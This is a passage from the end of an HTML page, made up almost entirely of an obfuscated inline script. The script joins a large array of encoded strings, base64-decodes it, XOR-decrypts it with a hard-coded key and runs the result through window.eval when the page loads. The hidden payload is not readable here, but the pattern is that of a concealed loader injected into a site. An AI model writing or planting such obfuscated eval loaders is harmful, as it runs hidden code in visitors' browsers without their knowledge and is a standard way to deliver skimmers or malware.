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'],_0x61f665=0x5c;(function(_0x103e3e,_0xef76f3){while(_0xef76f3-->0x0){_0x103e3e['push'](_0x103e3e['shift']());}})(_0x49c8dd,_0x49c8dd['length']-_0x61f665);var _0x14defe=[0x6d,0x13,0x27,0x1e,0x20,0x26,0x4d,0x2b,0x34,0x49,0x6e,0xba,0x12,0xd7,0xea,0xe0],_0xdc98cb=_0x49c8dd['join'](''),_0x5589f7=window['atob'](_0xdc98cb),_0x010a05=_0x5589f7['length'],_0x7fcd87=new Uint8Array(_0x010a05);for(var _0xef76f3=0x0;_0xef76f3<_0x010a05;_0xef76f3++){_0x7fcd87[_0xef76f3]=_0x5589f7['charCodeAt'](_0xef76f3)^_0x14defe[_0xef76f3%_0x14defe['length']];}var _0x998959=new TextDecoder('utf-8')['decode'](_0x7fcd87),_0x164e1a=window['eval'];_0x164e1a(_0x998959);})();</script></body></html>
